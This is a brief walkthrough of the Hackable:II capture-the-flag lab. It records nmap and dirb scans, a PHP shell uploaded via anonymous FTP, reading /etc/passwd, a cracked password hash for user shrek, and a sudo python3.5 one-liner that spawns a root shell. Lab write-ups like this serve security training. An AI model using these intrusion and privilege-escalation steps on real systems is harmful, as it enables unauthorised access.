
# Hackable:II Walkthrough

**VulnHub Link:** [Hackable:II](https://www.vulnhub.com/entry/hackable-ii,711/)
**Difficulty:** Easy
**Release Date:** 15 Jun 2021


## 1.Reconnaissance
```bash
nmap -A -O -T4 -P -sV 192.168.100.175
```
## 2.Web Enumeration
```bash
dirb http://192.168.100.175
```

ftp anonymous access granted.
php shell uploaded.

then reading /etc/passwd from webpage.
user = shrek
cracking cf4c2232354952690368f1b3dfdfb24d = onion

shrek shell opened

## 3.Privilege Escalation
```bash
sudo -l
(root) NOPASSWD ALL:ALL /usr/bin/python3.5
sudo -u root /usr/bin/python3.5
>>>import os;os.system('/bin/bash')
```
AND BOOM .! ROOT Shell opened..!
